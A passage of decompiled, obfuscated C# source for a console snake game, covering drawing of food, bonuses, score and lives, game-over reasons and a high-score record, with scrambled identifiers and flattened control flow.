              Console.ForegroundColor = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.food.Item.Color;
              num = 3;
              continue;
            case 81:
              goto label_24;
            default:
              goto label_3;
          }
        }
label_24:;
      }
      else
      {
        if ((!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.showingTimer ? 1 : 0) != 0)
          return;
        \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.showingTimer = false;
label_14:
        int num = 26;
        while (true)
        {
          switch (num ^ 76)
          {
            case 82:
              num = 24;
              continue;
            case 83:
              Console.Write("█████████");
              num = 25;
              continue;
            case 84:
              Console.ForegroundColor = ConsoleColor.White;
              num = 20;
              continue;
            case 85:
              num = 21;
              continue;
            case 86:
              Console.SetCursorPosition(3, checked (Console.WindowHeight - 1));
              num = 30;
              continue;
            case 87:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED98);
              num = 27;
              continue;
            case 88:
              num = 31;
              continue;
            case 89:
              goto label_23;
            default:
              goto label_14;
          }
        }
label_23:;
      }
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA0()
    {
      bool flag1;
      do
      {
        flag1 = true;
        int num1 = checked (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.bonuses.Count - 1);
        int index = 0;
        if (index == 0)
          goto label_30;
label_2:
        Console.SetCursorPosition(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.bonuses[index].Item.X, \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.bonuses[index].Item.Y);
label_4:
        int num2 = 12;
        bool flag2;
        while (true)
        {
          switch (num2 ^ 80)
          {
            case 83:
              Console.Write("███");
              num2 = 6;
              continue;
            case 84:
              flag2 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.bonuses[index].Item.X <= 3;
              num2 = 10;
              continue;
            case 85:
              Console.ForegroundColor = ConsoleColor.White;
              num2 = 11;
              continue;
            case 86:
              num2 = 7;
              continue;
            case 87:
              Segment segment;
              int num3 = checked ((segment = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.bonuses[index].Item).X - 1);
              segment.X = num3;
              num2 = 8;
              continue;
            case 88:
              num2 = 4;
              continue;
            case 89:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED92);
              num2 = 9;
              continue;
            case 90:
              if (flag2)
              {
                num2 = 13;
                continue;
              }
              goto label_17;
            case 91:
              num2 = 3;
              continue;
            case 92:
              num2 = 5;
              continue;
            case 93:
              goto label_16;
            default:
              goto label_4;
          }
        }
label_16:
        int num4 = 0;
        goto label_18;
label_17:
        num4 = 1;
label_18:
        if (num4 == 0)
        {
          \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.bonuses.RemoveAt(index);
          flag1 = false;
          if (!flag1)
            goto label_31;
        }
label_21:
        int num5 = 26;
        while (true)
        {
          switch (num5 ^ 76)
          {
            case 83:
              Console.ForegroundColor = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.bonuses[index].Item.Color;
              num5 = 25;
              continue;
            case 84:
              num5 = 22;
              continue;
            case 85:
              num5 = 20;
              continue;
            case 86:
              Console.CursorLeft = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.bonuses[index].Item.X;
              num5 = 21;
              continue;
            case 87:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8B);
              num5 = 27;
              continue;
            case 88:
              Console.Write("+{0}", (object) \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.bonuses[index].Level);
              num5 = 24;
              continue;
            case 89:
              num5 = 31;
              continue;
            case 90:
              goto label_29;
            default:
              goto label_21;
          }
        }
label_29:
        checked { ++index; }
label_30:
        if (index <= num1)
          goto label_2;
label_31:;
      }
      while ((!flag1 ? 1 : 0) != 0);
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA1(
      bool _param0 = false)
    {
      if ((\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.lastScore == \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.score && !_param0 ? 1 : 0) != 0)
        return;
      Console.ForegroundColor = ConsoleColor.White;
label_7:
      // ISSUE: reference to a compiler-generated method
      int num1 = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA90.\uE152\uE14D\uE4B1\uE4CF\uEFA5\uEAA8\uF7D2\uF85C\uF37D\uF074\uF5CA\uE496(19);
      int num2 = 0;
      while (true)
      {
        switch (num2 ^ 84)
        {
          case 81:
            switch (num1 + 73)
            {
              case 0:
                \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.lastScore = \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.score;
                num1 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(53);
                goto label_2;
              case 1:
                Console.SetCursorPosition(checked (Console.WindowWidth - 8), 0);
                num1 = -13;
                goto label_2;
              case 2:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED8B);
                num1 = -16;
                goto label_2;
              case 3:
                num1 = -14;
                goto label_2;
              case 4:
                Console.Write(string.Format(" {0} ", (object) \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.score));
                num1 = -11;
                goto label_2;
              case 5:
                num1 = -2;
                goto label_2;
              case 6:
                num1 = -15;
                goto label_2;
              case 7:
                goto label_17;
              default:
                num2 = 6;
                continue;
            }
          case 82:
            goto label_7;
          case 83:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA3);
            num2 = 7;
            continue;
          case 84:
label_2:
            num1 ^= 73;
            break;
        }
        num2 = 5;
      }
label_17:;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA2()
    {
      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = (!\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.expertMode ? 0 : 1) != 0 ? ConsoleColor.White : ConsoleColor.Gray;
label_4:
      int num1 = 0;
      int num2 = -2;
      while (true)
      {
        switch ((num2 ^ 81) + 84)
        {
          case 0:
            goto label_4;
          case 1:
            switch (num1)
            {
              case 77:
                Console.SetCursorPosition(checked (Console.WindowWidth - 8 - \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.lives - 5), checked (Console.WindowHeight - 1));
                num1 = 1;
                goto label_1;
              case 78:
                num1 = 3;
                goto label_1;
              case 79:
                num1 = 28;
                goto label_1;
              case 80:
                num1 = 29;
                goto label_1;
              case 81:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9C);
                num1 = 31;
                goto label_1;
              case 82:
                Console.Write(string.Format(" {0} | {1} | {2} ", (object) Strings.StrDup(\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.lives, "▌"), (object) \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.Index, (object) checked (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.currentLevel.FoodItemsCount - \uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.foodItemsCount)));
                num1 = 30;
                goto label_1;
              case 83:
                goto label_13;
              default:
                num2 = -3;
                continue;
            }
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED94);
            num2 = FormLoader.\uF6D9\uF827\uF028\uED0F\uECCA\uE547\uF4C8\uF468\uEA41\uE615\uE78E\uE0F5(31);
            continue;
          case 3:
label_1:
            num1 ^= 78;
            break;
        }
        num2 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(34);
      }
label_13:;
    }

    private static void \uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uEDA3()
    {
      int num1 = 2000;
label_4:
      do
      {
        int num2 = 31;
        int num3 = -9;
        while (true)
        {
          switch ((num3 ^ 79) + 75)
          {
            case 0:
              goto label_4;
            case 1:
              switch (num2)
              {
                case 75:
                  num2 = 30;
                  goto label_1;
                case 76:
                  checked { num1 -= 100; }
                  num2 = 29;
                  goto label_1;
                case 77:
                  Thread.Sleep(10);
                  num2 = 25;
                  goto label_1;
                case 78:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9C);
                  num2 = 28;
                  goto label_1;
                case 79:
                  goto label_13;
                default:
                  num3 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(28);
                  continue;
              }
            case 2:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uE35C\uEFCA\uEC87\uEFAF\uEAA0\uECEC\uF174\uE6AB\uE199\uE5D8\uF0E6\uED9C);
              num3 = -8;
              continue;
            case 3:
label_1:
              num2 ^= 82;
              break;
          }
          num3 = FoodItem.\uE607\uE6C8\uF041\uE1D1\uEB67\uF562\uF59C\uEDEA\uEABB\uE409\uF42B\uF64E(13);
        }
label_13:
        while ((!Console.KeyAvailable ? 0 : 1) != 0)
          Console.ReadKey();
      }
      while ((num1 <= 0 ? 0 : 1) != 0);
    }

    public enum \uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E0
    {
      None,
      EatOwnTail,
      HitWall,
      HitMaze,
      Hunger,
      UserQuit,
    }

    private class \uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E1
    {
      public string Name { get; set; }

      public int \uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEBC { get; set; }

      public string \uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEBD { get; set; }

      public int \uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEBE { get; set; }

      public bool \uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEBF { get; set; }

      public string \uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEC0 { get; set; }

      public \uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E1(
        string _param1,
        int _param2,
        string _param3,
        int _param4,
        bool _param5)
      {
        if ((_param1.Length >= 3 ? 1 : 0) == 0)
          _param1 = _param1.PadRight(3);
        if ((_param1.Length <= 3 ? 1 : 0) == 0)
          _param1 = _param1.Substring(0, 3);
        this.Name = _param1;
label_8:
        int num1 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(62);
        int num2 = 7;
        while (true)
        {
          switch (num2 ^ 57)
          {
            case 59:
              goto label_8;
            case 60:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E1.set_\uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEBD);
              num2 = 5;
              continue;
            case 61:
              switch (num1 + 56)
              {
                case 0:
                  num1 = -11;
                  goto label_5;
                case 1:
                  this.\uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEBC = _param2;
                  num1 = -16;
                  goto label_5;
                case 2:
                  this.\uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEBF = _param5;
                  num1 = -17;
                  goto label_5;
                case 3:
                  num1 = -21;
                  goto label_5;
                case 4:
                  this.\uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEBD = _param3;
                  num1 = -15;
                  goto label_5;
                case 5:
                  num1 = -10;
                  goto label_5;
                case 6:
                  num1 = -18;
                  goto label_5;
                case 7:
                  num1 = -13;
                  goto label_5;
                case 8:
                  num1 = -19;
                  goto label_5;
                case 9:
                  this.\uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEBE = _param4;
                  num1 = Mazes.\uED64\uF7C9\uE463\uE570\uEDE5\uF0EF\uEC88\uF1DB\uF4DB\uE913\uF508\uF2F8(53);
                  goto label_5;
                case 10:
                  this.\uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEC0 = Runtime.Platform.ToString();
                  num1 = -12;
                  goto label_5;
                case 11:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uF05A\uF4FF\uF524\uE25F\uF3A8\uF3B5\uE9DA\uF65C\uE3C6\uE7E0\uEE49\uEA94.\uEA18\uE662\uE59A\uF71C\uE343\uF05C\uEFC5\uE47C\uEDBC\uEFA1\uEA20\uE5E1.get_\uE5EE\uF3BC\uECFD\uE313\uF513\uF2EC\uE37A\uEDCF\uEBD8\uED8B\uF715\uEEBC);
                  num1 = -20;
                  goto label_5;
                case 12:
                  goto label_12;
                default:
                  num2 = 2;
                  continue;
              }
            case 62:
label_5:
              num1 ^= 63;
              break;
          }
          num2 = 4;
        }
label_12:;
      }
    }
  }
}
